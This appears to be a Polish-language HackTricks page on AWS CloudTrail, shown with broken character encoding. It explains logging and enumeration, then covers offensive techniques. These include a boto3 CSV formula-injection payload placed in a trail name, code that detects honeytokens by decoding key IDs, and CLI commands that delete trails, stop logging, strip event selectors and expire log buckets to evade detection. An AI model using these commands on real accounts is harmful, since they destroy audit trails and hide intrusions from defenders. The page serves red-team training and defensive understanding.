# AWS - CloudTrail Enum

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **CloudTrail**

AWS CloudTrail **rejestruje i monitoruje aktywnoÅ›Ä‡ w Twoim Å›rodowisku AWS**. Zbiera szczegÃ³Å‚owe **dzienniki zdarzeÅ„**, w tym kto, co, kiedy i skÄ…d, dla wszystkich interakcji z zasobami AWS. To zapewnia Å›lad audytowy zmian i dziaÅ‚aÅ„, wspierajÄ…c analizÄ™ bezpieczeÅ„stwa, audyt zgodnoÅ›ci i Å›ledzenie zmian zasobÃ³w. CloudTrail jest niezbÄ™dny do zrozumienia zachowaÅ„ uÅ¼ytkownikÃ³w i zasobÃ³w, poprawy postaw bezpieczeÅ„stwa oraz zapewnienia zgodnoÅ›ci z regulacjami.

KaÅ¼de zarejestrowane zdarzenie zawiera:

* NazwÄ™ wywoÅ‚anego API: `eventName`
* WywoÅ‚anÄ… usÅ‚ugÄ™: `eventSource`
* Czas: `eventTime`
* Adres IP: `SourceIPAddress`
* MetodÄ™ agenta: `userAgent`. PrzykÅ‚ady:
* Signing.amazonaws.com - Z AWS Management Console
* console.amazonaws.com - UÅ¼ytkownik gÅ‚Ã³wny konta
* lambda.amazonaws.com - AWS Lambda
* Parametry Å¼Ä…dania: `requestParameters`
* Elementy odpowiedzi: `responseElements`

Zdarzenia sÄ… zapisywane do nowego pliku dziennika **okoÅ‚o co 5 minut w pliku JSON**, sÄ… przechowywane przez CloudTrail, a na koniec pliki dziennika sÄ… **dostarczane do S3 okoÅ‚o 15 minut po**.\
Dzienniki CloudTrail mogÄ… byÄ‡ **agregowane w rÃ³Å¼nych kontach i regionach.**\
CloudTrail pozwala na uÅ¼ycie **integralnoÅ›ci plikÃ³w dziennika, aby mÃ³c zweryfikowaÄ‡, Å¼e Twoje pliki dziennika pozostaÅ‚y niezmienione** od momentu, gdy CloudTrail je dostarczyÅ‚. Tworzy skrÃ³t SHA-256 dziennikÃ³w w pliku skrÃ³tu. SkrÃ³t sha-256 nowych dziennikÃ³w jest tworzony co godzinÄ™.\
Podczas tworzenia Trail selektory zdarzeÅ„ pozwolÄ… Ci wskazaÄ‡, jakie zdarzenia majÄ… byÄ‡ rejestrowane: zarzÄ…dzanie, dane lub zdarzenia analityczne.

Dzienniki sÄ… przechowywane w wiadrze S3. DomyÅ›lnie uÅ¼ywana jest szyfrowanie po stronie serwera (SSE-S3), wiÄ™c AWS odszyfruje zawartoÅ›Ä‡ dla osÃ³b, ktÃ³re majÄ… do niej dostÄ™p, ale dla dodatkowego bezpieczeÅ„stwa moÅ¼esz uÅ¼yÄ‡ SSE z KMS i wÅ‚asnymi kluczami.

Dzienniki sÄ… przechowywane w **wiadrze S3 o tym formacie nazwy**:

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* Gdzie BucketName: **`aws-cloudtrail-logs-<accountid>-<random>`**
* PrzykÅ‚ad: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

WewnÄ…trz kaÅ¼dego folderu kaÅ¼dy dziennik bÄ™dzie miaÅ‚ **nazwÄ™ w tym formacie**: **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

Konwencja nazewnictwa plikÃ³w dziennika

![](<../../../../.gitbook/assets/image (122).png>)

Ponadto, **pliki skrÃ³tu (do sprawdzania integralnoÅ›ci plikÃ³w)** bÄ™dÄ… znajdowaÄ‡ siÄ™ w **tym samym wiadrze** w:

![](<../../../../.gitbook/assets/image (195).png>)

### Agregowanie dziennikÃ³w z wielu kont

* UtwÃ³rz Trail w koncie AWS, do ktÃ³rego chcesz, aby pliki dziennika byÅ‚y dostarczane
* Zastosuj uprawnienia do docelowego wiadra S3, umoÅ¼liwiajÄ…c dostÄ™p miÄ™dzy kontami dla CloudTrail i pozwÃ³l kaÅ¼demu kontu AWS, ktÃ³re potrzebuje dostÄ™pu
* UtwÃ³rz nowy Trail w innych kontach AWS i wybierz utworzone wiadro w kroku 1

Jednak nawet jeÅ›li moÅ¼esz zapisaÄ‡ wszystkie dzienniki w tym samym wiadrze S3, nie moÅ¼esz agregowaÄ‡ dziennikÃ³w CloudTrail z wielu kont do dziennikÃ³w CloudWatch naleÅ¼Ä…cych do jednego konta AWS.

{% hint style="danger" %}
PamiÄ™taj, Å¼e konto moÅ¼e mieÄ‡ **rÃ³Å¼ne Trail** z CloudTrail **wÅ‚Ä…czone**, przechowujÄ…ce te same (lub rÃ³Å¼ne) dzienniki w rÃ³Å¼nych wiadrach.
{% endhint %}

### CloudTrail ze wszystkich kont organizacji do 1

Podczas tworzenia CloudTrail, moÅ¼liwe jest wskazanie, aby aktywowaÄ‡ CloudTrail dla wszystkich kont w organizacji i uzyskaÄ‡ dzienniki do tylko 1 wiadra:

<figure><img src="../../../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

W ten sposÃ³b moÅ¼esz Å‚atwo skonfigurowaÄ‡ CloudTrail we wszystkich regionach wszystkich kont i scentralizowaÄ‡ dzienniki w 1 koncie (ktÃ³re powinieneÅ› chroniÄ‡).

### Sprawdzanie plikÃ³w dziennika

MoÅ¼esz sprawdziÄ‡, czy dzienniki nie zostaÅ‚y zmienione, uruchamiajÄ…c

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### Logs to CloudWatch

**CloudTrail moÅ¼e automatycznie wysyÅ‚aÄ‡ logi do CloudWatch, abyÅ› mÃ³gÅ‚ ustawiÄ‡ alerty, ktÃ³re ostrzegajÄ… ciÄ™, gdy wykonywane sÄ… podejrzane dziaÅ‚ania.**\
ZauwaÅ¼, Å¼e aby umoÅ¼liwiÄ‡ CloudTrail wysyÅ‚anie logÃ³w do CloudWatch, naleÅ¼y utworzyÄ‡ **rolÄ™**, ktÃ³ra pozwala na tÄ™ akcjÄ™. JeÅ›li to moÅ¼liwe, zaleca siÄ™ uÅ¼ycie domyÅ›lnej roli AWS do wykonywania tych dziaÅ‚aÅ„. Ta rola pozwoli CloudTrail na:

* CreateLogStream: To pozwala na tworzenie strumieni logÃ³w CloudWatch
* PutLogEvents: Dostarcza logi CloudTrail do strumienia logÃ³w CloudWatch

### Event History

Historia zdarzeÅ„ CloudTrail pozwala na przeglÄ…danie w tabeli logÃ³w, ktÃ³re zostaÅ‚y zarejestrowane:

![](<../../../../.gitbook/assets/image (89).png>)

### Insights

**CloudTrail Insights** automatycznie **analizuje** zdarzenia zarzÄ…dzania zapisem z tras CloudTrail i **informuje** ciÄ™ o **nietypowej aktywnoÅ›ci**. Na przykÅ‚ad, jeÅ›li nastÄ…pi wzrost zdarzeÅ„ `TerminateInstance`, ktÃ³ry rÃ³Å¼ni siÄ™ od ustalonych podstaw, zobaczysz to jako zdarzenie Insight. Te zdarzenia uÅ‚atwiajÄ… **znalezienie i reagowanie na nietypowÄ… aktywnoÅ›Ä‡ API** jak nigdy dotÄ…d.

Wnioski sÄ… przechowywane w tym samym koszu co logi CloudTrail w: `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### Security

| IntegralnoÅ›Ä‡ pliku logu CloudTrail  | <ul><li>Walidacja, czy logi nie zostaÅ‚y zmanipulowane (zmodyfikowane lub usuniÄ™te)</li><li><p>UÅ¼ywa plikÃ³w skrÃ³tÃ³w (tworzy hash dla kaÅ¼dego pliku)</p><ul><li>Haszowanie SHA-256</li><li>SHA-256 z RSA do podpisywania cyfrowego</li><li>klucz prywatny naleÅ¼Ä…cy do Amazon</li></ul></li><li>Tworzenie pliku skrÃ³tu zajmuje 1 godzinÄ™ (robione co godzinÄ™)</li></ul> |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Zatrzymaj nieautoryzowany dostÄ™p     | <ul><li><p>UÅ¼yj polityk IAM i polityk koszykÃ³w S3</p><ul><li>zespÃ³Å‚ bezpieczeÅ„stwa â€”> dostÄ™p administracyjny</li><li>audytorzy â€”> dostÄ™p tylko do odczytu</li></ul></li><li>UÅ¼yj SSE-S3/SSE-KMS do szyfrowania logÃ³w</li></ul>                                                                                                                                        |
| Zapobiegaj usuwaniu plikÃ³w logÃ³w     | <ul><li>Ogranicz dostÄ™p do usuwania za pomocÄ… polityk IAM i koszykÃ³w</li><li>Skonfiguruj usuwanie MFA S3</li><li>Walidacja za pomocÄ… Walidacji pliku logu</li></ul>                                                                                                                                                                                            |

## Access Advisor

AWS Access Advisor opiera siÄ™ na ostatnich 400 dniach logÃ³w AWS **CloudTrail, aby zebraÄ‡ swoje wnioski**. CloudTrail rejestruje historiÄ™ wywoÅ‚aÅ„ API AWS i zwiÄ…zanych z nimi zdarzeÅ„ dokonanych w koncie AWS. Access Advisor wykorzystuje te dane, aby **pokazaÄ‡, kiedy usÅ‚ugi byÅ‚y ostatnio uÅ¼ywane**. AnalizujÄ…c logi CloudTrail, Access Advisor moÅ¼e okreÅ›liÄ‡, ktÃ³re usÅ‚ugi AWS byÅ‚y uÅ¼ywane przez uÅ¼ytkownika IAM lub rolÄ™ oraz kiedy miaÅ‚o to miejsce. Pomaga to administratorom AWS podejmowaÄ‡ Å›wiadome decyzje dotyczÄ…ce **udoskonalania uprawnieÅ„**, poniewaÅ¼ mogÄ… zidentyfikowaÄ‡ usÅ‚ugi, ktÃ³re nie byÅ‚y uÅ¼ywane przez dÅ‚uÅ¼szy czas i potencjalnie zmniejszyÄ‡ zbyt szerokie uprawnienia na podstawie rzeczywistych wzorcÃ³w uÅ¼ycia.

{% hint style="success" %}
Dlatego Access Advisor informuje o **niepotrzebnych uprawnieniach przyznawanych uÅ¼ytkownikom**, aby administrator mÃ³gÅ‚ je usunÄ…Ä‡
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

## Actions

### Enumeration
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **CSV Injection**

MoÅ¼liwe jest przeprowadzenie ataku CVS w CloudTrail, ktÃ³ry wykona dowolny kod, jeÅ›li logi zostanÄ… wyeksportowane w formacie CSV i otwarte w Excelu.\
PoniÅ¼szy kod wygeneruje wpis logu z nieprawidÅ‚owÄ… nazwÄ… Trail zawierajÄ…cÄ… Å‚adunek:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
For more information about CSV Injections check the page:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

For more information about this specific technique check [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **Bypass Detection**

### HoneyTokens **bypass**

Honeytokens sÄ… tworzone w celu **wykrywania eksfiltracji wraÅ¼liwych informacji**. W przypadku AWS, sÄ… to **klucze AWS, ktÃ³rych uÅ¼ycie jest monitorowane**, jeÅ›li coÅ› wywoÅ‚a akcjÄ™ z tym kluczem, to ktoÅ› musiaÅ‚ ukraÅ›Ä‡ ten klucz.

JednakÅ¼e, Honeytokens, takie jak te stworzone przez [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren) uÅ¼ywajÄ… rozpoznawalnej nazwy konta lub tego samego identyfikatora konta AWS dla wszystkich swoich klientÃ³w. Dlatego, jeÅ›li moÅ¼esz uzyskaÄ‡ nazwÄ™ konta i/lub identyfikator konta bez powodowania, Å¼e Cloudtrail utworzy jakikolwiek log, **moÅ¼esz wiedzieÄ‡, czy klucz jest honeytokenem, czy nie**.

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57) ma pewne zasady, aby wykryÄ‡, czy klucz naleÅ¼y do [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**:**

* JeÅ›li **`canarytokens.org`** pojawia siÄ™ w nazwie roli lub identyfikator konta **`534261010715`** pojawia siÄ™ w komunikacie o bÅ‚Ä™dzie.
* TestujÄ…c je bardziej niedawno, uÅ¼ywajÄ… konta **`717712589309`** i nadal majÄ… ciÄ…g **`canarytokens.com`** w nazwie.
* JeÅ›li **`SpaceCrab`** pojawia siÄ™ w nazwie roli w komunikacie o bÅ‚Ä™dzie
* **SpaceSiren** uÅ¼ywa **uuids** do generowania nazw uÅ¼ytkownikÃ³w: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* JeÅ›li **nazwa wyglÄ…da na losowo wygenerowanÄ…**, istnieje duÅ¼e prawdopodobieÅ„stwo, Å¼e jest to HoneyToken.

#### Get the account ID from the Key ID

MoÅ¼esz uzyskaÄ‡ **identyfikator konta** z **zakodowanego** wewnÄ…trz **klucza dostÄ™pu** jak [**wyjaÅ›niono tutaj**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) i sprawdziÄ‡ identyfikator konta z twojÄ… listÄ… kont Honeytokens AWS:
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
SprawdÅº wiÄ™cej informacji w [**oryginalnych badaniach**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489).

#### Nie generuj logu

Najskuteczniejsza technika w tym przypadku jest wÅ‚aÅ›ciwie prosta. Po prostu uÅ¼yj klucza, ktÃ³ry wÅ‚aÅ›nie znalazÅ‚eÅ›, aby uzyskaÄ‡ dostÄ™p do jakiejÅ› usÅ‚ugi w swoim wÅ‚asnym koncie atakujÄ…cego. To spowoduje, Å¼e **CloudTrail wygeneruje log w TWOIM WÅASNYM koncie AWS, a nie w koncie ofiary**.

Rzecz w tym, Å¼e wynik pokaÅ¼e bÅ‚Ä…d wskazujÄ…cy na identyfikator konta i nazwÄ™ konta, wiÄ™c **bÄ™dziesz mÃ³gÅ‚ zobaczyÄ‡, czy to jest Honeytoken**.

#### UsÅ‚ugi AWS bez logÃ³w

W przeszÅ‚oÅ›ci istniaÅ‚y niektÃ³re **usÅ‚ugi AWS, ktÃ³re nie wysyÅ‚aÅ‚y logÃ³w do CloudTrail** (znajdÅº [listÄ™ tutaj](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). NiektÃ³re z tych usÅ‚ug **odpowiedzÄ…** z **bÅ‚Ä™dem** zawierajÄ…cym **ARN roli klucza**, jeÅ›li ktoÅ› nieautoryzowany (klucz honeytoken) sprÃ³buje uzyskaÄ‡ do nich dostÄ™p.

W ten sposÃ³b **atakujÄ…cy moÅ¼e uzyskaÄ‡ ARN klucza bez wywoÅ‚ywania jakiegokolwiek logu**. W ARN atakujÄ…cy moÅ¼e zobaczyÄ‡ **identyfikator konta AWS i nazwÄ™**, Å‚atwo jest poznaÄ‡ identyfikatory kont i nazwy firm HoneyToken, wiÄ™c w ten sposÃ³b atakujÄ…cy moÅ¼e zidentyfikowaÄ‡, czy token jest HoneyToken.

![](<../../../../.gitbook/assets/image (93).png>)

{% hint style="danger" %}
ZauwaÅ¼, Å¼e wszystkie publiczne API, ktÃ³re odkryto, Å¼e nie tworzÄ… logÃ³w CloudTrail, zostaÅ‚y teraz naprawione, wiÄ™c byÄ‡ moÅ¼e bÄ™dziesz musiaÅ‚ znaleÅºÄ‡ swoje wÅ‚asne...

Aby uzyskaÄ‡ wiÄ™cej informacji, sprawdÅº [**oryginalne badania**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/).
{% endhint %}

### Uzyskiwanie dostÄ™pu do infrastruktury trzeciej

NiektÃ³re usÅ‚ugi AWS **tworzÄ… pewnÄ… infrastrukturÄ™**, takÄ… jak **bazy danych** lub **klastry Kubernetes** (EKS). UÅ¼ytkownik **rozmawiajÄ…cy bezpoÅ›rednio z tymi usÅ‚ugami** (jak API Kubernetes) **nie bÄ™dzie uÅ¼ywaÅ‚ API AWS**, wiÄ™c CloudTrail nie bÄ™dzie w stanie zobaczyÄ‡ tej komunikacji.

Dlatego uÅ¼ytkownik z dostÄ™pem do EKS, ktÃ³ry odkryÅ‚ adres URL API EKS, mÃ³gÅ‚by wygenerowaÄ‡ token lokalnie i **rozmawiaÄ‡ z usÅ‚ugÄ… API bez wykrycia przez Cloudtrail**.

WiÄ™cej informacji w:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### Modyfikowanie konfiguracji CloudTrail

#### UsuÅ„ szlaki
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### Zatrzymaj Å›lady
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### WyÅ‚Ä…cz logowanie w wielu regionach

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
#### WyÅ‚Ä…czanie logowania za pomocÄ… selektorÃ³w zdarzeÅ„

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

W pierwszym przykÅ‚adzie pojedynczy selektor zdarzeÅ„ jest podany jako tablica JSON z pojedynczym obiektem. `"ReadWriteType": "ReadOnly"` wskazuje, Å¼e **selektor zdarzeÅ„ powinien rejestrowaÄ‡ tylko zdarzenia tylko do odczytu** (wiÄ™c CloudTrail insights **nie bÄ™dzie sprawdzaÄ‡ zdarzeÅ„ zapisu**, na przykÅ‚ad).

MoÅ¼esz dostosowaÄ‡ selektor zdarzeÅ„ w oparciu o swoje specyficzne wymagania.

#### Usuwanie logÃ³w za pomocÄ… polityki cyklu Å¼ycia S3

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### Modyfikacja konfiguracji koszyka

* UsuÅ„ koszyk S3
* ZmieÅ„ politykÄ™ koszyka, aby odmÃ³wiÄ‡ wszelkich zapisÃ³w z usÅ‚ugi CloudTrail
* Dodaj politykÄ™ cyklu Å¼ycia do koszyka S3, aby usunÄ…Ä‡ obiekty
* WyÅ‚Ä…cz klucz KMS uÅ¼ywany do szyfrowania dziennikÃ³w CloudTrail

### Ransomware Cloudtrail

#### Ransomware S3

MoÅ¼esz **wygenerowaÄ‡ klucz asymetryczny** i sprawiÄ‡, aby **CloudTrail szyfrowaÅ‚ dane** tym kluczem oraz **usunÄ…Ä‡ klucz prywatny**, aby zawartoÅ›Ä‡ CloudTrail nie mogÅ‚a byÄ‡ odzyskana.\
To jest zasadniczo **ransomware S3-KMS** wyjaÅ›nione w:

{% content-ref url="../../aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**Ransomware KMS**

To najprostszy sposÃ³b na przeprowadzenie poprzedniego ataku z rÃ³Å¼nymi wymaganiami dotyczÄ…cymi uprawnieÅ„:

{% content-ref url="../../aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **Referencje**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz hacking AWS:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz hacking GCP: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}
